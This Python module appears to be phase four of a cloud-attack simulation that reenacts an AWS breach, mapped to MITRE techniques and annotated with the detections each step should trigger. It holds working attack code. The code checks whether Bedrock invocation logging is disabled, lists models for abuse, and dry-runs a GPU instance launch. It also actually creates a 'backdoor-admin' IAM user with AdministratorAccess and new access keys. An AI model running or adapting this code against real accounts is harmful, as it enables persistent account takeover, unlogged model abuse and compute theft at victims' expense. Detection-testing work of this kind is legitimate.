"""
impact.py -- Phase 4: LLMjacking Reconnaissance, GPU Hijacking, Persistence

After achieving admin access, the attacker checks for Bedrock model access
(for LLMjacking), attempts to launch GPU instances (for crypto mining or
model training), and creates a backdoor user for persistent access.

CRITICAL SAFETY: The GPU recon function uses DryRun=True and NEVER actually
launches instances. This is a hard safety constraint that applies to all
execution modes including --auto.

MITRE ATT&CK Techniques:
  - T1496.004: Cloud Service Hijacking (LLMjacking recon)
  - T1496.001: Compute Hijacking (GPU dry run)
  - T1098.001: Additional Cloud Credentials (backdoor user)
  - T1136.003: Create Account: Cloud Account (backdoor user)
"""
import json
from typing import Any, Dict, List, Optional

import botocore

from config import AttackConfig
from utils import (
    console,
    format_table,
    print_detection,
    print_error,
    print_info,
    print_step,
    print_success,
    print_warning,
)


def check_bedrock_logging(config: AttackConfig) -> Dict[str, Any]:
    """
    Check if Amazon Bedrock model invocation logging is enabled.

    In the real attack, the attacker confirmed logging was disabled before
    invoking models. If logging is off, model invocations leave no audit
    trail of what prompts were sent or what outputs were generated.

    MITRE: T1496.004 (Cloud Service Hijacking)

    Args:
        config: The attack configuration (admin session required).

    Returns:
        Dict with logging status details.
    """
    print_step(1, "Checking Bedrock model invocation logging")
    admin = config.require_admin_session()

    try:
        bedrock = admin.client("bedrock")
        logging_config = bedrock.get_model_invocation_logging_configuration()
        log_cfg = logging_config.get("loggingConfig")

        if log_cfg is None:
            print_warning(
                "Bedrock invocation logging is NOT configured! "
                "Model usage would be invisible."
            )
            result = {"logging_enabled": False, "config": None}
        else:
            print_info("Bedrock invocation logging is configured")
            result = {"logging_enabled": True, "config": log_cfg}
    except botocore.exceptions.ClientError as exc:
        error_code = exc.response["Error"]["Code"]
        if error_code == "AccessDeniedException":
            print_info("Cannot check logging (AccessDenied)")
            result = {"logging_enabled": "unknown", "error": str(exc)}
        else:
            print_info(f"Logging check returned: {error_code}")
            result = {"logging_enabled": "unknown", "error": str(exc)}

    print_detection(
        "CSPM",
        "Bedrock model invocation logging is not enabled",
    )
    print_detection(
        "CDR",
        "GetModelInvocationLoggingConfiguration recon by compromised user",
    )
    return result


def enumerate_bedrock_models(config: AttackConfig) -> List[Dict[str, str]]:
    """
    List available Bedrock foundation models.

    The attacker catalogs available models to determine which are most
    valuable to abuse. High-end models like Claude and GPT-4 can cost
    $46,000/day when abused at scale.

    Args:
        config: The attack configuration (admin session required).

    Returns:
        List of dicts with modelId and providerName for available models.
    """
    print_step(2, "Enumerating available Bedrock models")
    admin = config.require_admin_session()

    try:
        bedrock = admin.client("bedrock")
        models_resp = bedrock.list_foundation_models()
        models = models_resp.get("modelSummaries", [])

        # Group by provider for display
        providers = {}
        for m in models:
            provider = m.get("providerName", "Unknown")
            providers.setdefault(provider, []).append(m["modelId"])

        for provider, model_ids in sorted(providers.items()):
            print_info(f"  {provider}: {len(model_ids)} models")

        result = [
            {
                "modelId": m["modelId"],
                "providerName": m.get("providerName", ""),
            }
            for m in models
        ]
        print_success(f"Found {len(models)} foundation models")
        return result
    except botocore.exceptions.ClientError as exc:
        print_error(f"Bedrock enumeration failed: {exc}")
        return []


def gpu_recon_dry_run(config: AttackConfig) -> Dict[str, Any]:
    """
    Search for Deep Learning AMIs and perform a DRY RUN ONLY of a GPU
    instance launch.

    *** SAFETY GUARDRAIL: This function ALWAYS uses DryRun=True ***
    *** It NEVER actually launches an EC2 instance. ***
    *** This constraint applies in ALL modes including --auto. ***

    In the real attack, the attacker:
    1. Searched for Deep Learning AMIs (found 1,300+)
    2. Tried p5.48xlarge (~$98/hr) -- failed due to capacity
    3. Launched p4d.24xlarge (8x A100 GPUs, $32.77/hr)

    MITRE: T1496.001 (Compute Hijacking)

    Args:
        config: The attack configuration (admin session required).

    Returns:
        Dict with AMI search results and dry run result.
    """
    print_step(3, "GPU instance reconnaissance (DRY RUN ONLY)")
    admin = config.require_admin_session()
    ec2 = admin.client("ec2")
    result = {}

    # Search for Deep Learning AMIs
    print_info("Searching for Deep Learning AMIs...")
    try:
        ami_resp = ec2.describe_images(
            Filters=[
                {
                    "Name": "name",
                    "Values": ["*Deep Learning*Ubuntu*"],
                }
            ],
        )
        amis = ami_resp.get("Images", [])
        result["ami_count"] = len(amis)
        print_success(f"Found {len(amis)} Deep Learning AMIs")

        # Find the most recent AMI
        if amis:
            sorted_amis = sorted(
                amis,
                key=lambda x: x.get("CreationDate", ""),
                reverse=True,
            )
            latest = sorted_amis[0]
            result["latest_ami"] = {
                "ImageId": latest["ImageId"],
                "Name": latest.get("Name", "")[:80],
                "CreationDate": latest.get("CreationDate", ""),
            }
            print_info(
                f"  Latest: {latest['ImageId']} "
                f"({latest.get('Name', '')[:50]}...)"
            )
    except botocore.exceptions.ClientError as exc:
        print_error(f"AMI search failed: {exc}")
        result["ami_count"] = 0

    # DRY RUN: Simulate launching a GPU instance
    # *** SAFETY: DryRun=True means AWS validates the request but does ***
    # *** NOT actually create any resources. This is a hard constraint. ***
    print_info("Performing GPU instance dry run (NO actual launch)...")
    ami_id = result.get("latest_ami", {}).get("ImageId", "ami-0123456789abcdef0")

    try:
        ec2.run_instances(
            ImageId=ami_id,
            InstanceType="p4d.24xlarge",
            MinCount=1,
            MaxCount=1,
            DryRun=True,  # *** SAFETY: ALWAYS True. NEVER set to False. ***
        )
        # This line should not be reached -- DryRun always raises an exception
        result["dry_run"] = "unexpected_success"
    except botocore.exceptions.ClientError as exc:
        error_code = exc.response["Error"]["Code"]
        if error_code == "DryRunOperation":
            # This means the request WOULD have succeeded
            print_warning(
                "DryRunOperation: Instance launch WOULD succeed! "
                "p4d.24xlarge = 8x A100 GPUs = $32.77/hr = $23,600/month"
            )
            result["dry_run"] = "would_succeed"
        elif error_code in (
            "InstanceLimitExceeded",
            "VcpuLimitExceeded",
            "InsufficientInstanceCapacity",
        ):
            print_info(
                f"Dry run blocked by service quota/capacity: {error_code}"
            )
            result["dry_run"] = f"blocked: {error_code}"
        else:
            print_info(f"Dry run result: {error_code}")
            result["dry_run"] = f"error: {error_code}"

    print_detection(
        "CDR",
        "RunInstances for GPU instance type from unusual principal",
    )
    print_detection(
        "CSPM",
        "No service quota limits set for GPU instance types",
    )
    return result


def create_backdoor_user(
    config: AttackConfig,
    username: str = "backdoor-admin",
) -> Dict[str, Any]:
    """
    Create a persistent backdoor IAM user with AdministratorAccess.

    This provides the attacker with a separate access path that survives
    rotation of the original compromised credentials or the admin user's keys.

    In the real attack, the attacker created this user at the 11-minute mark.

    MITRE: T1098.001 (Additional Cloud Credentials)
    MITRE: T1136.003 (Create Account: Cloud Account)

    Args:
        config: The attack configuration (admin session required).
        username: Name for the backdoor user (default: backdoor-admin).

    Returns:
        Dict with the new user's details and access key.
    """
    print_step(4, f"Creating backdoor user: {username}")
    admin = config.require_admin_session()
    iam = admin.client("iam")
    result = {}

    # Create the user
    try:
        create_resp = iam.create_user(UserName=username)
        result["user"] = {
            "UserName": create_resp["User"]["UserName"],
            "Arn": create_resp["User"]["Arn"],
        }
        print_success(f"User created: {create_resp['User']['Arn']}")
    except botocore.exceptions.ClientError as exc:
        if exc.response["Error"]["Code"] == "EntityAlreadyExists":
            print_warning(f"User {username} already exists (from previous run?)")
            result["user"] = {"UserName": username, "Arn": "already_exists"}
        else:
            print_error(f"Failed to create user: {exc}")
            return result

    # Attach AdministratorAccess
    try:
        iam.attach_user_policy(
            UserName=username,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )
        print_success("Attached AdministratorAccess policy")
    except botocore.exceptions.ClientError as exc:
        print_error(f"Failed to attach policy: {exc}")

    # Create access keys
    try:
        key_resp = iam.create_access_key(UserName=username)
        result["access_key"] = {
            "AccessKeyId": key_resp["AccessKey"]["AccessKeyId"],
            "SecretAccessKey": key_resp["AccessKey"]["SecretAccessKey"],
        }
        print_success(
            f"Access key created: "
            f"{key_resp['AccessKey']['AccessKeyId'][:8]}..."
        )
    except botocore.exceptions.ClientError as exc:
        print_error(f"Failed to create access key: {exc}")

    print_warning(
        "Attacker now has 3 independent admin access paths:\n"
        "    1. Original rag-pipeline-user (can re-exploit Lambda)\n"
        f"    2. Admin user '{config.admin_user_name}' (new key from Lambda)\n"
        f"    3. Backdoor user '{username}' (just created)"
    )

    print_detection(
        "CDR",
        "CreateUser followed by AttachUserPolicy with AdministratorAccess",
    )
    print_detection(
        "CIEM",
        "New IAM user with AdministratorAccess created outside normal process",
    )
    return result


def run_phase(config: AttackConfig) -> Dict[str, Any]:
    """
    Execute the complete Phase 4: Impact and Persistence.

    Returns a dict with all results from this phase.
    """
    from utils import print_phase_banner

    print_phase_banner(4, "IMPACT & PERSISTENCE")

    results = {}
    results["bedrock_logging"] = check_bedrock_logging(config)
    results["bedrock_models"] = enumerate_bedrock_models(config)
    results["gpu_recon"] = gpu_recon_dry_run(config)
    results["backdoor"] = create_backdoor_user(config)
    return results
